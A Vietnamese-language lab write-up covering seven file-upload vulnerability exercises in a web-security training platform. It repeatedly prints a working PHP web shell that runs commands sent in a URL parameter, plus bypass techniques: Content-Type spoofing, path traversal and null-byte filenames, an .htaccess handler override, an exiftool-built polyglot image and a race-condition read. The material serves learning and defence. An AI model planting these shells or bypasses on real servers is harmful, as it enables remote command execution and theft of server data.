<img width="940" height="566" alt="image" src="https://github.com/user-attachments/assets/9e7e464b-fa3e-4eff-9a8e-949c32a506ae" />**File Upload Vulnerabilities**

Lỗ hổng này là lỗ hổng upload file lên server mà server không kiểm tra kĩ bên trong có gì mà chỉ kiểm tra cơ bản như (tên, header, extension).

Hacker sẽ chèn các payload mã độc này vào bên trong file và upload lên server để khai thác.

Trong bài này tôi sẽ dùng đoạn mã web shell php như bên dưới để upload:

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
```

**Lab: Remote code execution via web shell upload**

<img width="940" height="638" alt="image" src="https://github.com/user-attachments/assets/863dcf5c-f224-4f62-aaa0-794a98d6b6ee" />



Bài này bảo có lỗ hổng ở chỗ upload file vì server không kiểm tra gì trước khi upload lên server.

Làm bài này bằng cách upload web shell php lên và đọc nội dung ở đường dẫn */home/carlos/secret*.

Tài khoản đăng nhập cho sẵn: *wiener:peter*

Vào bài ta thấy có chức năng đăng nhập và home

<img width="940" height="463" alt="image" src="https://github.com/user-attachments/assets/e4caba5b-4fe0-4d71-9690-0d05b64e1914" />


Đăng nhập tài khoản **wiener** và mật khẩu **peter** đề bài cho sẵn, đăng nhập thành công ta thấy chức năng upload file mà đề bài đã nhắc đến.

<img width="940" height="445" alt="image" src="https://github.com/user-attachments/assets/3d129fd0-a44f-401e-8d03-1afbac73a8cd" />


Thử upload một file ảnh bất kì lên xem server phản hồi như nào.

<img width="760" height="303" alt="image" src="https://github.com/user-attachments/assets/d2020119-e764-4bb9-8564-902dce31a3b3" />


Server phản hồi cho biết file ảnh vừa upload lên được lưu trữ ở đường dẫn *avatars/\<ten_file\>,* sau khi upload tôi quay lại tài khoản và thấy mình đã có avatar vừa upload.

<img width="836" height="397" alt="image" src="https://github.com/user-attachments/assets/57f45f16-49a0-49b7-a3d6-cbd0b6e7dec7" />


Biết ảnh vừa upload được lưu trữ ở đâu tôi liền dùng burp suite truy cập vào xem có truy cập được không và thấy toàn mã nhị phân của ảnh.

<img width="940" height="359" alt="image" src="https://github.com/user-attachments/assets/e25d877d-9181-4f92-a8de-3652fa75fb47" />


Giờ tôi chuẩn bị payload web shell php để upload:

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
```

Vì server không kiểm tra nội dung file upload lên nên tôi bắt request POST để chèn payload vào.

<img width="886" height="682" alt="image" src="https://github.com/user-attachments/assets/89195281-28ea-4297-acc9-b96b52795057" />


Request POST

<img width="850" height="656" alt="image" src="https://github.com/user-attachments/assets/da79da66-4aa4-419d-b21f-1dbe64283937" />

Tôi đã chèn nội dung payload web shell vào body của hearder và sửa trường *filename=”meme.jpg”* thành *filename=”meme.php”* vì payload là mã PHP và server thực thi nó.

Gửi request sau khi đã chỉnh sửa thì server chấp nhận nó và phản hồi cho biết file được lưu ở đường dẫn *avatars/meme.php.*

<img width="940" height="374" alt="image" src="https://github.com/user-attachments/assets/ca01b5d2-de9d-4225-a361-5ca3ec42169f" />

Sau khi biết file được lưu ở đường dẫn này, tôi truy cập nó trên trình duyệt để mở file và server không kiểm tra và thực thi payload tạo ra ô input để khai thác.

<img width="940" height="224" alt="image" src="https://github.com/user-attachments/assets/ef55ca16-a666-4b10-9cfa-8576919885d0" />

Đề bài yêu cầu đọc nội dung ở */home/carlos/secret*, dùng lệnh *cat /home/carlos/secret* và lấy được nội dung.

<img width="940" height="251" alt="image" src="https://github.com/user-attachments/assets/f67a3367-9946-4266-a184-077704f0a587" />

Mang ra ngoài submit và thành công.

<img width="940" height="448" alt="image" src="https://github.com/user-attachments/assets/0e834e26-2c2d-464e-8836-8b5e989cc8c0" />

**Lab: Web shell upload via Content-Type restriction bypass**

<img width="797" height="565" alt="image" src="https://github.com/user-attachments/assets/db3d000d-6902-41b1-b73e-f1f33bfdf51d" />

Bài này vẫn bảo có lỗ hổng ở chỗ upload file nhưng nó đã lọc mấy file gây hại.

Login tài khản đã cho sẵn và upload thử file ảnh lên và server vẫn chấp nhận, thử upload file khác lên xem và nó báo chỉ nhận file ảnh thôi.

<img width="940" height="185" alt="image" src="https://github.com/user-attachments/assets/069d4a34-998c-4709-b656-cbbc32560086" />

Có vẻ đã được lọc, tôi kiểm tra request này và phát hiện một trường dùng để kiểm soát file được upload lên.

<img width="940" height="372" alt="image" src="https://github.com/user-attachments/assets/09ce8f07-8b71-41a0-aeec-edd2670229d7" />

Như phản hồi của server chỉ cho upload file ảnh lên nên tôi sữa value của header **Content-Type** từ *application/octet-stream* thành *image/png* như định dạng mà server cho phép và upload thành công.

<img width="940" height="372" alt="image" src="https://github.com/user-attachments/assets/7955df22-acf8-4035-8e17-a0f040d8e321" />

Truy cập trình duyệt và thực hiện lệnh *cat /home/carlos/secret* để đọc nội dung ở đường dẫn */home/carlos/secret.*

<img width="940" height="172" alt="image" src="https://github.com/user-attachments/assets/9beb449a-9d54-40de-b9aa-93535fe23fd6" />

Submit và thành công.

Đọc thêm file hệ thống ở */var/www/html/upload.php* để cách server lọc.

<img width="940" height="367" alt="image" src="https://github.com/user-attachments/assets/1dc6fe44-2ffe-462b-97d6-6d70b6eb1ba3" />

**Lab: Web shell upload via path traversal**

<img width="940" height="636" alt="image" src="https://github.com/user-attachments/assets/9f0b0ee0-fb39-4220-b16d-a2ff9102aff6" />

Lỗ hổng vẫn ở chỗ upload file nhưng lần này đề bài bảo server sẽ không thực thì file được upload lên ở thư mục được lưu nhưng ở thư mục khác thì chưa biết, cần phải thử.

Mục tiêu đọc nội dung ở /home/carlos/secret với tài khoản cho sẵn: wiener:peter.

Login với tài khoản được cho sẵn tôi thư upload file ảnh lên để kiểm tra phản hồi.

<img width="940" height="216" alt="image" src="https://github.com/user-attachments/assets/d52399ad-7a39-4ce9-b06e-0112ac35cfd8" />

Phản hồi cho thấy upload bình thường, tôi thử upload web shell lên để khai thác.

<img width="940" height="352" alt="image" src="https://github.com/user-attachments/assets/0ba05ba1-889c-4a83-b0cc-997ba84ce101" />

Upload thành công web shell và được lưu ở avatars/meme.php.

<img width="940" height="351" alt="image" src="https://github.com/user-attachments/assets/a8c7af91-5fa7-4a73-9f43-af2fa3b78dab" />

File đã được upload lên và lưu trên server.

Tôi thử đọc thư mục nhưng không được, có vẻ server đã fix lỗ hổng này bằng cách không cho phép thực thi các file được tải lên.

Đề bài có nhắc tới đường dẫn khác, có vẻ ta có thể khai thác nó ở đường dẫn nào đó.

<img width="940" height="369" alt="image" src="https://github.com/user-attachments/assets/aa2d25f2-dfa1-4a85-9355-200d690ef577" />

Tôi thử dùng ../ để lưu file vào thư mục cha của nó nhưng phản hồi vẫn lưu ở avatars, tôi thử encode url lại xem.

<img width="940" height="369" alt="image" src="https://github.com/user-attachments/assets/669c8626-b663-4014-b2a3-a5092fdd6f86" />

Sau khi endcode url thì thấy phản hồi chuẩn, file được lưu ở *avatars/../meme.php*.

Cấu trúc đường dẫn ban đầu: /file/avatars/ , file upload lên đươc lưu ở /file/avatars/meme.php nhưng tại avatar hệ thống đã được cấu hình không cho phép thực thi file, nhưng thư mục khác thì có nên tôi sửa giá trị header filename thành “../meme.php” khi server thực hiện lưu file thì sẽ lưu ở /file/meme.php vì hệ thống đọc được ../ (lệnh lùi cấp).

Giờ tôi truy cập /file/meme.php để thực hiện đọc nội dung yêu cầu.

<img width="940" height="221" alt="image" src="https://github.com/user-attachments/assets/23402a79-7d74-4587-b205-90144ed5e777" />

Done

Đọc thêm file hệ thống:

<img width="940" height="368" alt="image" src="https://github.com/user-attachments/assets/caf7042d-a3e0-4e62-a9df-607c6384250e" />

```
$target_file = urldecode($target_dir.$_FILES["avatar"]["name"]);
```

Đoạn code nối thẳng tên file được upload lên vào avatars/ và không lọc ../ nên upload ../meme.php lên thì:

```
$target_file = urldecode("avatars/../meme.php")
```

File sẽ dược lưu ở thưc mục cha.

**Lab: Web shell upload via extension blacklist bypass**

<img width="940" height="451" alt="image" src="https://github.com/user-attachments/assets/825f9ac6-65ae-491e-b43b-e491c3e53453" />

Bài này bị lỗ hổng upload file nhưng nó đã được fix bằng cách lọc đuôi file .php, đề nhắc có thể pybass bằng cách sửa đổi cách lọc.

Mục tiêu đọc nội dung tại /home/carlos/secret với tài khoản cho trước: viener:peter

Login vào tài khoản đã cho và thử upload file .php lên để xem phản hồi.

<img width="940" height="249" alt="image" src="https://github.com/user-attachments/assets/0420c315-15e8-4cc4-a725-61e958da2643" />

Nó bảo không cho upload file php, đề bài có nhắc đến cấu hình … có thể đọc thêm ở [**đây**](https://medium.com/@besh0x79/bypassing-file-upload-filters-using-htaccess-fc4091d1e51a).

Để làm bài này ta cần cấu hình lại cách lọc của server bằng upload file .htaccess.

Cơ chế hoạt động:

Mỗi khi có người truy cập một file trong thư mục, hệ thống sẽ tự động tìm và đọc file .htaccess trong thư mục đó, rồi áp dụng các quy tắc bên trong.

Áp dụng để giải bài này tôi tạo file .htaccess có nội dung: AddType application/x-httpd-php .txt

Có nghĩa mọi file tải lên có đuôi .txt đều được thực thi như là file .php.

Upload file .htaccess vừa tao lên thấy phản hồi file đã được lưu ở avatars/.htaccess.

<img width="940" height="255" alt="image" src="https://github.com/user-attachments/assets/9b439e86-d209-464b-bb1f-5b7012a71d5f" />

Sau khi đã upload file cấu hình mới lên server tôi upload một file txt khác và chèn web shell vào header và upload lên.

<img width="940" height="374" alt="image" src="https://github.com/user-attachments/assets/80bf930a-dc3b-4fa0-a742-7c39f1cd31ea" />

Upload được file web shell lên và được lưu ở đường dẫn avatars/meme.txt, tôi truy cập và đọc nội dung ở /home/carlos/secret như yêu cầu.

<img width="940" height="365" alt="image" src="https://github.com/user-attachments/assets/a2880eca-dfe3-41c1-ba8d-fc98a882c63b" />

Done

Đọc thêm file hệ thống:

<img width="940" height="374" alt="image" src="https://github.com/user-attachments/assets/547c79f8-ab59-4bf7-a725-04b0ecbbc777" />

```
if ($imageFileType == "php" || $imageFileType == "phtml") {
echo "Sorry, php files are not allowed\n";
$uploadOk = false;
}
```

Đoạn code chỉ thấy lọc mỗi file php và phtml.

**Lab: Web shell upload via obfuscated file extension**

<img width="940" height="587" alt="image" src="https://github.com/user-attachments/assets/37f22206-7026-4161-af04-03f1d3fc3223" />

Bài này cho biết đã fix những lỗi ở các bài trước nhưng có thể pybass bằng cách gì đó.

Đã login và upload file ảnh và file .php để test.

<img width="940" height="326" alt="image" src="https://github.com/user-attachments/assets/42f6c4b0-b52f-458a-bd55-b6d346f5a6f2" />

<img width="940" height="206" alt="image" src="https://github.com/user-attachments/assets/4ed5ed47-fc50-46e9-99e6-105db91c7a3a" />

File ảnh đã nhận còn file php bị chặn.

Mày mò thì phát hiện cách bypass bằng null byte injection để bypass kiểm tra đuôi file, có thể đọc thêm ở [đây](https://blogs.jsmon.sh/what-is-null-byte-injection-in-file-upload-ways-to-exploit-examples-and-impact/).

Bắt request upload file sửa meme.php thành meme.php%00.jpg, hệ thống sẽ kiểm tra tên file và thấy có đuôi .jpg và cho qua, khi đọc đến %00 hệ thống biết nó là null byte gấy lỗi và dừng kiểm tra nên file meme.php không được lọc và lưu với tên meme.php.

<img width="940" height="370" alt="image" src="https://github.com/user-attachments/assets/055b0c8c-7923-42ef-882a-a293ae8d9840" />

Upload xong ta biết nó được lưu ở avatars/meme.php, truy cập và khai thác.

<img width="940" height="257" alt="image" src="https://github.com/user-attachments/assets/57e84abc-6ae0-4a04-b193-8cbb7f8105de" />

Đọc file hệ thống:

<img width="940" height="366" alt="image" src="https://github.com/user-attachments/assets/70a0b80f-0ac5-4395-8311-0a6d9bbedf69" />

```
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
if($imageFileType != "jpg" && $imageFileType != "png") {
echo "Sorry, only JPG & PNG files are allowed\n";
$uploadOk = false;
}
```

Đây là whitelist chỉ cho phép .jpg và .png.

Dòng tạo ra lỗ hổng null byte:

```
//cut off anything after null byte
$target_file = strtok($target_file, chr(0));
```

- chr(0) = null byte (ký tự \x00)

- strtok(\$target_file, chr(0)) = cắt bỏ mọi thứ sau null byte

**Lab: Remote code execution via polyglot web shell upload**

<img width="940" height="491" alt="image" src="https://github.com/user-attachments/assets/95c3dc51-2c43-4780-9d53-e2735c3a8220" />

Bài này nó đã kiểm tra kĩ hơn bằng cách kiểm tra magic bytes (byte của file ảnh).

Magic bytes (HEX):

- **JPEG/JPG**: FF D8 FF

- **PNG**: 89 50 4E 47 0D 0A 1A 0A

<img width="940" height="451" alt="image" src="https://github.com/user-attachments/assets/ae4eef25-a0b2-4476-b09a-c7be3056b78c" />

Vào trang ta thực hiện login tài khoản đã cho trước **wiener:peter.**

<img width="940" height="450" alt="image" src="https://github.com/user-attachments/assets/27020545-ea05-4e66-bd47-4c71ded79c8d" />

Sau khi login, thực hiện chức năng tải tệp lên để test tính năng.

<img width="940" height="326" alt="image" src="https://github.com/user-attachments/assets/ba34f71b-4f01-4052-bc38-823103bddae4" />

Upload file ảnh meme.jpg lên và được phản hồi file đã được lưu ở avatars/meme.jpg, truy cập thử và xem được ảnh.

<img width="940" height="474" alt="image" src="https://github.com/user-attachments/assets/61576b28-6957-470a-b3e4-f4cc366097ff" />

Kiểm tra magic bytes ảnh:

<img width="790" height="259" alt="image" src="https://github.com/user-attachments/assets/d29412b8-b347-4e3b-a22d-a13fa16333be" />

Thấy FF D8 FF là định dạng file ảnh, tôi sửa nó rồi upload lên xem phản hồi.

<img width="816" height="203" alt="image" src="https://github.com/user-attachments/assets/0664ce22-a40e-492e-9adf-49c3feca996d" />

File sau khi sửa và tải lên thì có phản hồi file không phải file ảnh, xác nhận server chỉ nhận file ảnh và có kiểm tra qua magic bytes.

Tôi sẽ dùng ExifTool để nhúng vào Exif metadata là phần cấu trúc hợp lệ của JPEG, ExifTool nhúng PHP code vào đúng field Comment của Exif, không làm hỏng cấu trúc file. Nếu tự chèn thủ công, file có thể bị lỗi structure, server check ảnh sâu hơn sẽ phát hiện.

Sử dụng payload để chèn web shell php file:

```
exiftool -Comment="$(cat << 'EOF'
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
EOF
)" meme.jpg -o polyglot.php
```

<img width="554" height="108" alt="image" src="https://github.com/user-attachments/assets/4c849450-785d-41ec-abe0-4c2914194ab3" />

<img width="940" height="143" alt="image" src="https://github.com/user-attachments/assets/c8a27641-b942-4ef8-8273-a92930a9398f" />



Sau khi truy cập đường dẫn file thì thấy file web shell đã được thực và có web shell, từ đây thực hiện lệnh để đọc nội dung ở thư mục */home/carlos/secret.*
**Lab: Web shell upload via race condition**

<img width="940" height="566" alt="image" src="https://github.com/user-attachments/assets/44b447c4-74c5-4d50-ac8e-872dc8c9690e" />

Bài này đã fix mấy lỗ hổng ở trên nhưng nó lại có lỗ hổng Race Condition, tức là upload file độc hại rồi tranh thủ gọi nó trước khi server kiểm tra/xóa.

Vào thử thách ta thực hiện login với tài khoản và mật khẩu đề bài đã cho: **wiener:peter**, sau khi login sẽ hiện chức năng upload file, tôi thử các cách như những bài trước và không xảy ra lỗ hổng.

Tên đề bài là Race Condition có vẻ liên quan đến tốc độ.

<img width="940" height="451" alt="image" src="https://github.com/user-attachments/assets/08225089-9b00-430c-91a8-c0d0f5ca18a0" />

Thực hiện upload file để lấy request và chuyển sang Turbo Intruder.

Turbo Intruder là một extension của Burp Suite dùng để gửi rất nhiều request với tốc độ cao.

<img width="940" height="501" alt="image" src="https://github.com/user-attachments/assets/199980c0-09cb-4c98-958e-b3744612c3af" />

Khi chuyển sang ta sẽ có được giao diện như này.

<img width="940" height="677" alt="image" src="https://github.com/user-attachments/assets/55ee0759-a07a-4bd3-a936-e2d95ee5d971" />

Đoạn code bên dưới được sử dụng để khai thác lỗi race condition trong chức năng upload avatar. Script sẽ gửi đồng thời một request POST để upload file meme.php và nhiều request GET truy cập file đó tại /files/avatars/meme.php. Mục đích là tận dụng khoảng thời gian rất ngắn khi file đã được lưu trên server nhưng chưa bị kiểm tra và xóa. Nếu request GET truy cập đúng thời điểm, mã PHP trong file sẽ được thực thi.

Thay nội dung file bằng mã PHP này để server đọc file và thực thi:

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Sau khi bấm run ta đã đọc được nội dung file như trong ảnh — request upload `meme.php` (POST) và các request GET dồn dập truy cập `/files/avatars/meme.php` đã chèn đúng thời điểm trong khoảng cửa sổ race condition, response trả về nội dung bí mật:

<img width="940" height="676" alt="image" src="https://github.com/user-attachments/assets/53e7051a-552f-4d21-ae0a-9a38e9859920" />

Done.
